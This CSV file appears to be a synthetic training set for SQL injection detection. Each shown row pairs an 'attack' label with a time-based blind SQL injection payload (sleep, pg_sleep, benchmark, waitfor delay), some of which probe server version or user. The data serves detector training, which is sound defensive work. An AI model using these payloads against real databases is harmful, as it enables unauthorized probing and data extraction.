id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000362,attack,time,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cneo"" like ""cneo",nearest_attack_euclidean,R000076,1.1641444866242032
SMOTE_000363,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000072,2.022293346993729
SMOTE_000364,attack,time,"1"" waitfor delay '0:0:5' and ""dvfr"" like ""dvfr",nearest_attack_euclidean,R000154,0.6567440834678738
SMOTE_000365,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,0.87501138409118
SMOTE_000366,attack,time,"1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000054,0.5909645007757564
SMOTE_000367,attack,time,"select sleep  (  5  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000152,1.1171328094819466
SMOTE_000368,attack,time,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",nearest_attack_euclidean,R000100,0.4876795990637092
SMOTE_000369,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   # igen",nearest_attack_euclidean,R000080,1.0704557240592243
SMOTE_000370,attack,time,1'||  (  select 'tfqg' from dual where 9862  =  9862 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000060,1.9028737519338392
SMOTE_000371,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,0.40028459999765614
SMOTE_000372,attack,time,select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,nearest_attack_euclidean,R000084,0.24666231746933973
SMOTE_000373,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'gfpd'  =  'gfpd",nearest_attack_euclidean,R000141,1.2571271866202587
SMOTE_000374,attack,time,1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000053,0.27873710187324574
SMOTE_000375,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.00024892669465004566
SMOTE_000376,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,1.097974177605279
SMOTE_000377,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,1.0618885828647575
SMOTE_000378,attack,time,"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000047,0.13421270516890754
SMOTE_000379,attack,time,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cneo"" like ""cneo",nearest_attack_euclidean,R000076,1.0625761167422838
SMOTE_000380,attack,time,1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'wevl'  =  'wevl,nearest_attack_euclidean,R000104,1.6737476433901037
SMOTE_000381,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.14411978828324165
SMOTE_000382,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,1.312948501418766
SMOTE_000383,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,1.218787329769899
SMOTE_000384,attack,time,select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,nearest_attack_euclidean,R000084,0.44673020054390283
SMOTE_000385,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,nearest_attack_euclidean,R000096,0.1833010974624358
SMOTE_000386,attack,time,"1'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000126,1.1160962893877047
SMOTE_000387,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000072,1.1946028029429292
SMOTE_000388,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000072,1.12197355642141
SMOTE_000389,attack,time,"1""  )   as rnjx where 2679  =  2679 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000081,1.6577250137766504
SMOTE_000390,attack,time,1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000062,7.596230298856327
SMOTE_000391,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000042,1.218338493163824
SMOTE_000392,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.6034496178439631
SMOTE_000393,attack,time,1'+  (  select 'nlvq' where 7528  =  7528 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000120,1.0347133345004254
SMOTE_000394,attack,time,"select sleep  (  5  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000152,1.4847005440130348
SMOTE_000395,attack,time,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",nearest_attack_euclidean,R000100,0.5518948139759484
SMOTE_000396,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,1.8620578269656525
SMOTE_000397,attack,time,1 and sleep  (  5  )  -- ruuv,nearest_attack_euclidean,R000107,0.927750729246251
SMOTE_000398,attack,time,"1'   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000109,0.947051253019099
SMOTE_000399,attack,time,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000035,0.8623053244018888
SMOTE_000400,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.06733343341016178
SMOTE_000401,attack,time,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  -- ybmz,nearest_attack_euclidean,R000150,1.6999206685221009
SMOTE_000402,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000072,0.9317406391197439
SMOTE_000403,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,1.004799716868965
SMOTE_000404,attack,time,1   )    )    or sleep  (  5  )  #,nearest_attack_euclidean,R000048,0.5133136800253324
SMOTE_000405,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000042,1.0618663488192028
SMOTE_000406,attack,time,1' waitfor delay '0:0:5'--,nearest_attack_euclidean,R000156,0.505244110495126
SMOTE_000407,attack,time,"1   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  9558  =  9558",nearest_attack_euclidean,R000101,1.6295526480975633
SMOTE_000408,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,0.6319688845458511
SMOTE_000409,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.14340871966020335
SMOTE_000410,attack,time,1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000058,0.3380769269929536
SMOTE_000411,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.2215398892501799
SMOTE_000412,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,0.03686692402541073
SMOTE_000413,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,1.0182190674039926
SMOTE_000414,attack,time,"1""  )   as gdcx where 2335  =  2335 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000142,0.08123469355792291
SMOTE_000415,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.2656692548192077
SMOTE_000416,attack,time,"1""  )   where 7165  =  7165 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000118,0.09063752561352617
SMOTE_000417,attack,time,"1""  )   where 7165  =  7165 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000118,1.4388462823997035
SMOTE_000418,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,1.3128303143891025
SMOTE_000419,attack,time,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""baia""  =  ""baia",nearest_attack_euclidean,R000046,0.6396308767517398
SMOTE_000420,attack,time,1'   )    )    as qgyz where 1547  =  1547 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000151,1.7236890915990395
SMOTE_000421,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,1.9651151609627855
SMOTE_000422,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000079,0.16955067225123763
SMOTE_000423,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,0.46270748787811716
SMOTE_000424,attack,time,"1"" waitfor delay '0:0:5' and ""dvfr"" like ""dvfr",nearest_attack_euclidean,R000154,1.651292799781262
SMOTE_000425,attack,time,1%'   )    )    or sleep  (  5  )  #,nearest_attack_euclidean,R000113,1.4444570944690942
SMOTE_000426,attack,time,1%'   )    )    or sleep  (  5  )  #,nearest_attack_euclidean,R000113,0.3507221915797979
SMOTE_000427,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000079,1.2483628249422625
SMOTE_000428,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,0.34851228267999523
SMOTE_000429,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.2999981270958193
SMOTE_000430,attack,time,1   )    )    or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000033,0.31819560088361515
SMOTE_000431,attack,time,"1""  )   as gdcx where 2335  =  2335 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000142,1.0475549741972319
SMOTE_000432,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,0.9584309926269418
SMOTE_000433,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,0.14133467237449482
SMOTE_000434,attack,time,1'+  (  select mavu where 4276  =  4276 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000115,0.9914028713637731
SMOTE_000435,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,nearest_attack_euclidean,R000086,0.7040359973909691
SMOTE_000436,attack,time,1%' or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000125,0.8250235307241317
SMOTE_000437,attack,time,"1%""  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000090,0.3598092901500217
SMOTE_000438,attack,time,1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'wevl'  =  'wevl,nearest_attack_euclidean,R000104,0.033600798020564135
SMOTE_000439,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.4127313105849757
SMOTE_000440,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.0181313683243055
SMOTE_000441,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000134,3.3558634288300264
SMOTE_000442,attack,time,"1""  )   as gdcx where 2335  =  2335 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000142,0.2018571477341624
SMOTE_000443,attack,time,1  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000088,0.6062894226013691
SMOTE_000444,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.26158686440172463
SMOTE_000445,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000093,1.895275031871243
SMOTE_000446,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,0.4735065668123564
SMOTE_000447,attack,time,""" or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000040,0.9487618063278539
SMOTE_000448,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.4152251058545798
SMOTE_000449,attack,time,"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000149,1.9615230428359378
SMOTE_000450,attack,time,1' waitfor delay '0:0:5'--,nearest_attack_euclidean,R000156,0.8488034863293928
SMOTE_000451,attack,time,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000077,1.511305835772277
SMOTE_000452,attack,time,1'+  (  select 'nlvq' where 7528  =  7528 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000120,2.439279677158873
SMOTE_000453,attack,time,sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000041,0.3834290254981483
SMOTE_000454,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,0.6549187036393121
SMOTE_000455,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000134,0.20373685675036923
SMOTE_000456,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,0.7468415227995047
SMOTE_000457,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,0.22034589877270472
SMOTE_000458,attack,time,select sleep  (  5  )   and   (  'dcys' like 'dcys,nearest_attack_euclidean,R000135,0.5915413777756401
SMOTE_000459,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'nond'  =  'nond",nearest_attack_euclidean,R000119,1.0414570241156549
SMOTE_000460,attack,time,1   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000111,0.4681917244259124
SMOTE_000461,attack,time,"select sleep  (  5  )   and ""%""  =  """,nearest_attack_euclidean,R000116,0.9644904664063141
SMOTE_000462,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.0
SMOTE_000463,attack,time,"1""  )   waitfor delay '0:0:5' and   (  ""hhzy"" like ""hhzy",nearest_attack_euclidean,R000091,0.12199158661096693
SMOTE_000464,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   # igen",nearest_attack_euclidean,R000080,1.5313220058190251
SMOTE_000465,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,2.5334528679318624
SMOTE_000466,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,1.3006355020835594
SMOTE_000467,attack,time,"1'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000126,1.0714225488800244
SMOTE_000468,attack,time,"1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000067,1.208940084468984
SMOTE_000469,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000146,0.09716663263203734
SMOTE_000470,attack,time,"1   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  9558  =  9558",nearest_attack_euclidean,R000101,0.5669776777347161
SMOTE_000471,attack,time,select sleep  (  5  )   and   (  'dcys' like 'dcys,nearest_attack_euclidean,R000135,0.5839371641005535
SMOTE_000472,attack,time,waitfor delay '0:0:5' and 'dfzn'  =  'dfzn,nearest_attack_euclidean,R000144,2.50022808745329
SMOTE_000473,attack,time,1   )    )    or sleep  (  5  )  #,nearest_attack_euclidean,R000048,0.4364836307662154
SMOTE_000474,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000042,1.0054060730971202
SMOTE_000475,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000146,1.1880695417265745
SMOTE_000476,attack,time,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'xwsb'  =  'xwsb",nearest_attack_euclidean,R000147,0.6866839151843164
SMOTE_000477,attack,time,"""   )    )   ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000034,3.1259124261975897
SMOTE_000478,attack,time,1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000062,1.1027369803918157
SMOTE_000479,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,0.7187684960288165
SMOTE_000480,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,1.756595519328423
SMOTE_000481,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,1.2627900906486613
SMOTE_000482,attack,time,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar",nearest_attack_euclidean,R000095,4.351061500223698e-05
SMOTE_000483,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'nond'  =  'nond",nearest_attack_euclidean,R000119,0.9031253722170495
SMOTE_000484,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000146,1.0636094282240522
SMOTE_000485,attack,time,select sleep  (  5  )   and   (  'dcys' like 'dcys,nearest_attack_euclidean,R000135,0.4760014391820673
SMOTE_000486,attack,time,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000035,1.2274560265849488
SMOTE_000487,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.11434630693476255
SMOTE_000488,attack,time,"select sleep  (  5  )   and ""%""  =  """,nearest_attack_euclidean,R000116,1.7040659569262127
SMOTE_000489,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.4240253254315188
SMOTE_000490,attack,time,waitfor delay '0:0:5' and 'dfzn'  =  'dfzn,nearest_attack_euclidean,R000144,1.345732398803179
SMOTE_000491,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000042,1.099522958033038
SMOTE_000492,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.9437135579275306
SMOTE_000493,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,1.3160308493658488
SMOTE_000494,attack,time,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000050,0.754718346563469
SMOTE_000495,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,0.30556137327283167
SMOTE_000496,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,0.8818386997407985
SMOTE_000497,attack,time,1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000062,0.6037132953200656
SMOTE_000498,attack,time,"select sleep  (  5  )   and ""%""  =  """,nearest_attack_euclidean,R000116,1.1577116526244575
SMOTE_000499,attack,time,1'+  (  select mavu where 4276  =  4276 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000115,0.8466948091933173
SMOTE_000500,attack,time,1%'   )    )    or sleep  (  5  )  #,nearest_attack_euclidean,R000113,0.13519777055110357
